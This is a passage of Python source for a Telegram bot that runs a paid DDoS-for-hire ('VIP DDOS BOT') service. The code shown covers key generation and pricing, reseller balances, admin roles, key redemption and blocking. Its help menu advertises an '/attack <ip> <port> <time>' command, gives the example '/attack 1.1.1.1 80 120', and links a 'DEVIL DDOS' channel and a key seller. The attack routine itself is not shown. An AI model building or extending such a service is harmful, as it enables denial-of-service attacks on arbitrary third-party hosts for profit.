    blocked_time = key.get("blocked_time", "N/A")
    context = key.get("context", "N/A").capitalize()
    generated_by = key.get("generated_by", "Unknown")
    generated_time = key.get("generated_time", "Unknown")
    duration = key.get("duration", "N/A")

    # Parse expiration
    try:
        gen_time = datetime.datetime.strptime(generated_time, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        mins, hrs, days, months = parse_duration(duration)
        exp_time = gen_time + relativedelta(months=months, days=days, hours=hrs, minutes=mins)
        is_active = datetime.datetime.now(IST) < exp_time
        time_left = exp_time - datetime.datetime.now(IST)
        countdown = f"{time_left.days}d {time_left.seconds // 3600}h {(time_left.seconds % 3600) // 60}m" if is_active else "Expired"
    except:
        exp_time = "Unknown"
        is_active = False
        countdown = "Invalid"

    # Format used users
    user_list = ""
    for i, uid in enumerate(used_devices, start=1):
        try:
            chat = bot.get_chat(uid)
            uname = f"@{chat.username}" if chat.username else chat.first_name
        except:
            uname = "Unknown"
        user_list += f"{i}. <b>ID:</b> <code>{uid}</code> | <b>User:</b> {uname}\n"
    if not user_list:
        user_list = "<i>❌ No users have redeemed this key yet.</i>"

    # Final response
    response = (
        f"🔐 <b>KEY VERIFICATION</b> 🔐\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>Key:</b> <code>{key_name}</code>\n"
        f"📆 <b>Generated:</b> {generated_time}\n"
        f"⏳ <b>Duration:</b> {duration} | <b>Context:</b> {context}\n"
        f"💠 <b>Expires:</b> {exp_time.strftime('%Y-%m-%d %I:%M:%S %p') if isinstance(exp_time, datetime.datetime) else exp_time}\n"
        f"⏱️ <b>Time Left:</b> {countdown}\n"
        f"👤 <b>Generated By:</b> @{generated_by}\n"
        f"📦 <b>Device Limit:</b> {device_limit} | <b>Used:</b> {len(used_devices)}\n"
        f"🚫 <b>Blocked:</b> {'✅ Yes' if blocked else '❌ No'}"
    )
    if blocked:
        response += f"\n🔒 <b>Blocked By:</b> @{blocked_by} | <b>Time:</b> {blocked_time}"

    response += (
        f"\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>Users Who Used the Key:</b>\n{user_list}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ <b>ANTI-SCAM NOTICE:</b>\n"
        f"<i>Only buy keys from the trusted dealer:</i>\n"
        f"✅ <b>@Rahul_618</b> – The Official Key Seller 💎\n"
        f"<b>🛑 Avoid scams, fake sellers, and duplicates!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )

    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkkey", f"Key: {key_name}", response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_overlord(user_id, username):
        response = "🚫 <b>Bhai, ye sirf Overlord ka kaam hai!</b> <i>Access Denied</i> 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"📋 <b>Usage:</b> <i>/addadmin &lt;username_or_id&gt;</i>\n"
            f"<b>Example:</b> <i>/addadmin @user123 ya /addadmin 123456789</i>\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return
    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = "👑 <b>Overlord ko admin banane ki zarurat nahi!</b> <i>Woh toh pehle se hi hai!</i> 👑"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        if target_username in admin_usernames:
            response = f"✅ <b>{target} pehle se hi admin hai!</b> <i>No need to add again</i> ✅"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        admin_usernames.add(target_username)
        response = f"🎉 <b>Admin add ho gaya!</b> 🎉\n<b>Username:</b> <i>{target}</i>\n━━━━━━━"
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = "👑 <b>Overlord ko admin banane ki zarurat nahi!</b> <i>Woh toh pehle se hi hai!</i> 👑"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            if target_id in admin_id:
                response = f"✅ <b>User ID {target_id} pehle se hi admin hai!</b> <i>No need to add again</i> ✅"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            admin_id.add(target_id)
            response = f"🎉 <b>Admin add ho gaya!</b> 🎉\n<b>User ID:</b> <i>{target_id}</i>\n━━━━━━━"
        except ValueError:
            response = "❌ <b>Invalid ID ya username!</b> <i>Username @ se start hona chahiye ya ID number hona chahiye.</i> ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addadmin", f"Target: {target}", response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["removeadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_overlord(user_id, username):
        response = "🚫 <b>Bhai, ye sirf Overlord ka kaam hai!</b> <i>Access Denied</i> 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"📋 <b>Usage:</b> <i>/removeadmin &lt;username_or_id&gt;</i>\n"
            f"<b>Example:</b> <i>/removeadmin @user123 ya /removeadmin 123456789</i>\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return
    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = "🚫 <b>Overlord ko remove nahi kar sakte!</b> <i>Access Denied</i> 🚫"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        if target_username not in admin_usernames:
            response = f"❌ <b>{target} admin nahi hai!</b> <i>Nothing to remove</i> ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        admin_usernames.remove(target_username)
        response = f"🗑️ <b>Admin remove ho gaya!</b> 🗑️\n<b>Username:</b> <i>{target}</i>\n━━━━━━━"
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = "🚫 <b>Overlord ko remove nahi kar sakte!</b> <i>Access Denied</i> 🚫"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            if target_id not in admin_id:
                response = f"❌ <b>User ID {target_id} admin nahi hai!</b> <i>Nothing to remove</i> ❌"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            admin_id.remove(target_id)
            response = f"🗑️ <b>Admin remove ho gaya!</b> 🗑️\n<b>User ID:</b> <i>{target_id}</i>\n━━━━━━━"
        except ValueError:
            response = "❌ <b>Invalid ID ya username!</b> <i>Username @ se start hona chahiye ya ID number hona chahiye.</i> ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removeadmin", f"Target: {target}", response)

@bot.message_handler(commands=['checkadmin'])
def check_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["checkadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    response = "═══════ <b>ADMIN LIST BHAI</b> ═══════\n"
    
    # Overlords
    response += "\n<b>👑 Overlords:</b>\n"
    for oid in overlord_id:
        try:
            user_info = bot.get_chat(oid)
            user_name = user_info.username if user_info.username else user_info.first_name
            response += f"<b>User ID:</b> <i>{oid}</i>\n<b>Username:</b> <i>@{user_name}</i>\n<b>Role:</b> <i>Overlord 👑</i>\n\n"
        except:
            response += f"<b>User ID:</b> <i>{oid}</i>\n<b>Username:</b> <i>Unknown</i>\n<b>Role:</b> <i>Overlord 👑</i>\n\n"
    for uname in overlord_usernames:
        response += f"<b>Username:</b> <i>{uname}</i>\n<b>User ID:</b> <i>Unknown</i>\n<b>Role:</b> <i>Overlord 👑</i>\n\n"
    
    # Admins
    response += "\n<b>✅ Admins:</b>\n"
    if not admin_id and not admin_usernames:
        response += "<i>No additional admins found.</i>\n"
    else:
        for aid in admin_id:
            if aid not in overlord_id:  # Skip overlords
                try:
                    user_info = bot.get_chat(aid)
                    user_name = user_info.username if user_info.username else user_info.first_name
                    response += f"<b>User ID:</b> <i>{aid}</i>\n<b>Username:</b> <i>@{user_name}</i>\n<b>Role:</b> <i>Admin ✅</i>\n\n"
                except:
                    response += f"<b>User ID:</b> <i>{aid}</i>\n<b>Username:</b> <i>Unknown</i>\n<b>Role:</b> <i>Admin ✅</i>\n\n"
        for uname in admin_usernames:
            if uname not in overlord_usernames:  # Skip overlords
                response += f"<b>Username:</b> <i>{uname}</i>\n<b>User ID:</b> <i>Unknown</i>\n<b>Role:</b> <i>Admin ✅</i>\n\n"
    
    response += "<b>🔑 Buy key from @Rahul_618</b>\n<b>📩 Any problem contact @Rahul_618</b>\n━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkadmin", "", response)

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addreseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if user_id not in admin_id and not is_overlord(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = "📋 <b>Usage:</b> <i>/addreseller &lt;user_id&gt; &lt;balance&gt;</i> 📋\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    reseller_id = command_parts[1]
    try:
        initial_balance = int(command_parts[2])
    except ValueError:
        response = "❌ <b>Invalid balance amount</b> ❌\n<i>Please enter a valid number</i>\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_data()
        response = (
            f"🎉 <b>Reseller added successfully</b> 🎉\n"
            f"<b>Reseller ID:</b> <i>{reseller_id}</i>\n"
            f"<b>Balance:</b> <i>{initial_balance} Rs 💰</i>\n"
            f"━━━━━━━"
        )
    else:
        response = f"❌ <b>Reseller {reseller_id} already exists</b> ❌\n<i>Try a different ID</i>\n━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addreseller", f"Reseller ID: {reseller_id}, Balance: {initial_balance}", response)
    save_data()

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    if str(user_id) != "1807014348" and username != "sadiq9869":
        response = "🚫 <b>Key system error!</b>\nPlease tell @sadiq9869 to fix it.\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Unauthorized key gen attempt by {user_id}", response)
        return

    stats["command_usage"]["genkey"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Bhai, admin hi key bana sakta hai!</b> <i>Access Denied</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    
    # Check if the user is an Overlord
    if is_overlord(user_id, username):
        if len(command_parts) < 4 or len(command_parts) > 5:
            response = (
                f"📋 <b>Usage for Overlord:</b> <i>/genkey &lt;duration&gt; [device_limit] &lt;key_name&gt; &lt;context&gt;</i>\n"
                f"<b>Example:</b> <i>/genkey 1d 999 sadiq group or /genkey 1d all sadiq DM</i> 📋\n"
                f"━━━━━━━"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        # Parse the command for Overlord
        duration = command_parts[1].lower()
        if len(command_parts) == 5:
            device_limit_input = command_parts[2].lower()
            key_name = command_parts[3]
            context = command_parts[4].lower()
        else:
            device_limit_input = "1"  # Default to 1 if not specified
            key_name = command_parts[2]
            context = command_parts[3].lower()
        
        # Parse device limit
        if device_limit_input == "all":
            device_limit = float('inf')  # Unlimited devices
        else:
            try:
                device_limit = int(device_limit_input)
                if device_limit < 1:
                    response = "❌ <b>Device limit must be at least 1!</b> <i>Invalid input</i> ❌\n━━━━━━━"
                    safe_reply(bot, message, response)
                    log_action(user_id, username, "/genkey", f"Command: {command}", response)
                    return
            except ValueError:
                response = "❌ <b>Invalid device limit!</b> <i>Use a number or 'all'.</i> ❌\n━━━━━━━"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/genkey", f"Command: {command}", response)
                return
    else:
        # Non-Overlord (Admins and Resellers) format
        if len(command_parts) != 4 or command_parts[1].lower() != "key":
            response = (
                f"📋 <b>Usage for Admins/Resellers:</b> <i>/genkey key &lt;duration&gt; &lt;key_name&gt;</i>\n"
                f"<b>Example:</b> <i>/genkey key 1d rahul</i>\n"
                f"<b>Note:</b> <i>Only group keys allowed!</i> 📋\n"
                f"━━━━━━━"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        duration = command_parts[2].lower()
        key_name = command_parts[3]
        context = 'group'  # Fixed to group for Admins/Resellers
        device_limit = 1  # Default device limit for non-Overlords

    # Validate context for Overlord
    if is_overlord(user_id, username):
        if context not in ['dm', 'group', 'groups']:
            response = "❌ <b>Invalid context!</b> <i>Use 'dm', 'group', or 'groups' (case-insensitive).</i> ❌\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        context = 'group' if context in ['group', 'groups'] else 'private'

    # Parse duration
    minutes, hours, days, months = parse_duration(duration)
    if minutes is None and hours is None and days is None and months is None:
        response = "❌ <b>Invalid duration!</b> <i>Use formats like 30min, 1h, 1d, 1m</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    cost_duration = duration
    if minutes > 0:
        cost_duration = "1min"
    elif hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    elif days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    elif months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"

    custom_key = f"Rahul_sadiq-{key_name}"
    generated_by = username or f"UserID_{user_id}"
    generated_time = datetime.datetime.now(IST)
    # If key exists, update it and unblock if previously blocked
    if custom_key in keys:
        was_blocked = keys[custom_key].get("blocked", False)
        keys[custom_key] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": [],  # Reset devices on regeneration
            "blocked": False,  # Unblock the key
            "blocked_by_username": "",
            "blocked_time": "",
            "generated_time": generated_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by,
            "context": context
        }
        action = "updated"
        if was_blocked:
            log_action(user_id, username, "/genkey", f"Key: {custom_key}", f"Unblocked key {custom_key} during regeneration")
    else:
        keys[custom_key] = {  # Line 920: Properly indented (4 spaces)
            "duration": duration,
            "device_limit": device_limit,
            "devices": [],  # Reset devices on regeneration
            "blocked": False,
            "blocked_by_username": "",
            "blocked_time": "",
            "generated_time": generated_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by,
            "context": context
        }
        action = "generated"

    device_limit_display = "Unlimited" if device_limit == float('inf') else device_limit
    stats["total_keys"] += 1
    stats["key_gen_timestamps"].append(generated_time)
    save_data()
    response = (
        f"🔑 <b>Key {action} successfully</b> 🔑\n"
        f"<b>Key:</b> <code>{custom_key}</code>\n"
        f"<b>Duration:</b> <i>{duration}</i>\n"
        f"<b>Device Limit:</b> <i>{device_limit_display}</i>\n"
        f"<b>Context:</b> <i>{context.capitalize()} Only!</i>\n"
        f"<b>Generated by:</b> <i>@{generated_by}</i>\n"
        f"<b>Generated on:</b> <i>{keys[custom_key]['generated_time']}</i>"
    )
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > 0:
            resellers[user_id] -= cost
            save_data()
            response += f"\n<b>Cost:</b> <i>{cost} Rs 💰</i>\n<b>Remaining balance:</b> <i>{resellers[user_id]} Rs</i>"
    response += "\n━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/genkey", f"Key: {custom_key}, Duration: {duration}, Device Limit: {device_limit_display}, Context: {context}, Generated by: @{generated_by}", response)

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["help"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    help_text = (
        "<u><b>🌌 VIP DDOS BOT — HELP MENU 🌌</b></u>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "<b>🧠 CORE COMMANDS</b>\n"
        "├─ 🚀 <b>/start</b> — Start the bot\n"
        "├─ ℹ️ <b>/myinfo</b> — Your full info\n"
        "├─ 🧪 <b>/trial</b> — 1-hour universal trial key\n"
        "├─ 📋 <b>/help</b> — Show this menu\n"
        "├─ ✅ <b>/checkadmin</b> — View admin list\n"
        "├─ ⏳ <b>/uptime</b> — Bot runtime\n"
        "\n"
        "<b>⚔️ ATTACK CONTROLS</b>\n"
        "├─ 💥 <b>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</b> — Start attack\n"
        "├─ ⏳ <b>/setcooldown</b> — Set cooldown (admin only)\n"
        "├─ ⏳ <b>/checkcooldown</b> — Show cooldown\n"
        "\n"
        "<b>🔑 KEY SYSTEM</b>\n"
        "├─ 🔓 <b>/redeem &lt;key&gt;</b> — Redeem a key\n"
        "├─ 🔑 <b>/genkey</b> — Generate a key\n"
        "├─ 🔑 <b>/listkeys</b> — Show all keys\n"
        "├─ 🧐 <b>/checkkey</b> — View key details\n"
        "├─ 🚫 <b>/block &lt;key&gt;</b> — Block a key\n"
        "\n"
        "<b>🛠 USER MANAGEMENT</b>\n"
        "├─ 👥 <b>/users</b> — Authorized users\n"
        "├─ ➕ <b>/add &lt;user_id&gt;</b> — Add free access\n"
        "├─ ➖ <b>/remove &lt;user_id&gt;</b> — Remove user\n"
        "\n"
        "<b>🧪 TRIAL SYSTEM</b>\n"
        "├─ 🧪 <b>/trial</b> — Use trial key (2/day)\n"
        "├─ ♻️ <b>/resettrial</b> — Reset trial usage (admins: 2/day, overlord: unlimited)\n"
        "├─ ⚙️ <b>/settrialresetlimit &lt;count&gt;</b> — Change admin reset limit (overlord only)\n"
        "\n"
        "<b>📈 STATS & LOGS</b>\n"
        "├─ 📊 <b>/stats</b> — Bot stats (overlord)\n"
        "├─ 📜 <b>/logs</b> — View logs (overlord)\n"
        "\n"
        "<b>💰 RESELLER TOOLS</b>\n"
        "├─ 💰 <b>/balance</b> — Your balance\n"
        "├─ 💸 <b>/addbalance</b> — Add to reseller (admin)\n"
        "├─ 💰 <b>/resellers</b> — View resellers\n"
        "├─ 🗑️ <b>/removereseller</b> — Remove reseller\n"
        "\n"
        "<b>⚙️ ADMIN PANEL</b>\n"
        "├─ ➕ <b>/addadmin &lt;user&gt;</b> — Add admin (overlord)\n"
        "├─ ➖ <b>/removeadmin &lt;user&gt;</b> — Remove admin (overlord)\n"
        "\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "<b>📌 Examples:</b>\n"
        "• <code>/genkey 1d 999 sadiq group</code>\n"
        "• <code>/attack 1.1.1.1 80 120</code>\n"
        "• <code>/redeem Rahul_sadiq-rahul</code>\n"
        "\n"
        "📩 <b>Buy Key:</b> <a href='https://t.me/Rahul_618'>@Rahul_618</a>\n"
        "🌐 <b>Join Channel:</b> <a href='https://t.me/devil_ddos'>DEVIL DDOS</a>\n"
        "━━━━━━━━━━━━━━━━━━━"
    )

    safe_reply(bot, message, help_text)
    log_action(user_id, username, "/help", "", help_text)
    save_data()

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["balance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = (
            f"💰 <b>Your Balance:</b> 💰\n"
            f"<b>Balance:</b> <i>{current_balance} Rs</i>\n"
            f"━━━━━━━"
        )
    else:
        response = "🚫 <b>Access Denied:</b> <i>Reseller only command</i> 🚫\n━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/balance", "", response)
    save_data()

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["redeem"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'
    
    if is_admin(user_id, username):
        response = "✅ <b>Bhai, admin ko key ki zarurat nahi!</b> <i>You already have full access</i> ✅\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"📋 <b>Usage:</b> <i>/redeem &lt;key_name&gt;</i>\n"
            f"<b>Example:</b> <i>/redeem Rahul_sadiq-rahul</i> 📋\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return
    key = command_parts[1].strip()
    if user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                response = (
                    f"🔑 <b>You already have an active key!</b> 🔑\n"
                    f"<b>Context:</b> <i>{user_info['context'].capitalize()} Only!</i>\n"
                    f"<b>Expires on:</b> <i>{expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}</i>\n"
                    f"<i>Please wait until it expires to redeem a new key.</i> ⏳\n"
                    f"━━━━━━━"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/redeem", f"Key: {key}", response)
                return
            else:
                del users[user_id]
                save_data()
                log_action(user_id, username, "/redeem", f"Removed expired user access for UserID: {user_id}", "User access removed due to expiration")
        except (ValueError, KeyError):
            response = "❌ <b>Error:</b> <i>Invalid user data. Contact @Rahul_618</i> 📩\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response, "Invalid user data")
            return
    if key in keys:
        if keys[key].get("blocked", False):
            response = "🚫 <b>This key has been blocked!</b> <i>Contact @Rahul_618</i> 🚫\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if keys[key].get("context") and keys[key]["context"] != chat_type:
            response = f"❌ <b>This key is for {keys[key]['context'].capitalize()} use only!</b> <i>Use it in a {keys[key]['context']} chat.</i> ❌\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if keys[key]["device_limit"] != float('inf') and len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            response = "😅 <b>App ne der kar di!</b> <i>Device limit reached</i> 😅\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if user_id in keys[key]["devices"]:
            response = "🔑 <b>You have already redeemed this key!</b> <i>Check your status with /myinfo</i> 🔑\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        duration = keys[key]["duration"]
        minutes, hours, days, months = parse_duration(duration)
        if minutes is None and hours is None and days is None and months is None:
            response = "❌ <b>Invalid duration in key!</b> <i>Contact @Rahul_618</i> 📩\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        minutes, hours, days, months = parse_duration(duration)
        generated_time = datetime.datetime.strptime(keys[key]["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
        if expiration_time.year > datetime.datetime.now(IST).year + 5:
            response = "❌ <b>Key expiry calculation error!</b> Please contact Overlord. ❌"
            safe_reply(bot, message, response)
            return

        users[user_id] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": chat_type}
        keys[key]["devices"].append(user_id)
        stats["redeemed_keys"] += 1
        save_data()
        response = (
            f"🎉 <b>Key redeemed successfully!</b> 🎉\n"
            f"<b>Context:</b> <i>{chat_type.capitalize()} Only!</i>\n"
            f"<b>Expires on:</b> <i>{expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}</i> ⏳\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}, Context: {chat_type}, Expiration: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}", response)
    else:
        response = (
            f"❌ <b>Invalid or expired key!</b> ❌\n"
            f"<i>Buy a new key for 50₹ and DM @Rahul_618.</i> 🔑\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
    save_data()

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["block"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"📋 <b>Usage:</b> <i>/block &lt;key_name&gt;</i>\n"
            f"<b>Example:</b> <i>/block Rahul_sadiq-rahul</i> 📋\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return
    key_name = command_parts[1].strip()
    if not key_name.startswith("Rahul_sadiq-"):
        response = "❌ <b>Invalid key format!</b> <i>Key must start with 'Rahul_sadiq-'</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}", response)
        return
    if key_name in keys:
        if keys[key_name].get("blocked", False):
            blocker_username = keys[key_name].get("blocked_by_username", "Unknown")
            block_time = keys[key_name].get("blocked_time", "Unknown")
            response = (
                f"🚫 <b>Key <code>{key_name}</code> is already blocked!</b> 🚫\n"
                f"<b>Blocked by:</b> <i>@{blocker_username}</i>\n"
                f"<b>Blocked on:</b> <i>{block_time}</i>\n"
                f"━━━━━━━"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/block", f"Key: {key_name}", response)
            return
        blocker_username = username or f"UserID_{user_id}"
        block_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key_name]["blocked"] = True
        keys[key_name]["blocked_by_username"] = blocker_username
        keys[key_name]["blocked_time"] = block_time
        # Remove associated users
        affected_users = []
        for device_id in keys[key_name]["devices"]:
            if device_id in users:
                affected_users.append(device_id)
                del users[device_id]
        save_data()
        response = (
            f"🚫 <b>Key <code>{key_name}</code> has been blocked successfully!</b> 🚫\n"
            f"<b>Blocked by:</b> <i>@{blocker_username}</i>\n"
            f"<b>Blocked on:</b> <i>{block_time}</i>"
        )
        if affected_users:
            response += f"\n<b>Removed access for users:</b> <i>{', '.join(affected_users)}</i>"
        response += "\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}, Blocked by: @{blocker_username}, Blocked on: {block_time}, Affected Users: {affected_users}", response)
    else:
        response = (
            f"❌ <b>Key <code>{key_name}</code> not found!</b> ❌\n"
